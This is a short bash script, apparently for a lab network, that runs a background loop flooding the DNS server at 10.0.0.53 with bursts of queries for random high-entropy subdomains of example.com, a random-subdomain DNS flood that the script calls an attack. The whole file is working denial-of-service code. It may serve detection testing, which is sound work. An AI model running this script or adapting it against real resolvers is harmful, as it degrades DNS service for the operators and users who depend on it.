#!/bin/bash

TARGET=10.0.0.53
PIDFILE=/tmp/dns_entropy_attack.pid

if [ -f "$PIDFILE" ]; then
  echo "[!] Attack already running (PID $(cat $PIDFILE))"
  exit 1
fi

(
while true; do
    BURST=$((20 + RANDOM % 40))   # 20–60 pkt/s

    for i in $(seq 1 $BURST); do
        LEN=$((5 + RANDOM % 20))

        LABEL=$(head /dev/urandom | tr -dc 'a-z0-9' | head -c $LEN)

        if [ $((RANDOM % 2)) -eq 0 ]; then
            QNAME="$LABEL.$(head /dev/urandom | tr -dc a-z | head -c5).example.com"
        else
            QNAME="$LABEL.example.com"
        fi

        dig @$TARGET $QNAME +tries=1 +timeout=1 >/dev/null 2>&1 &
    done

    wait
    sleep 1
done
) &

echo $! > "$PIDFILE"
echo "[*] High-entropy DNS attack started (PID $!)"

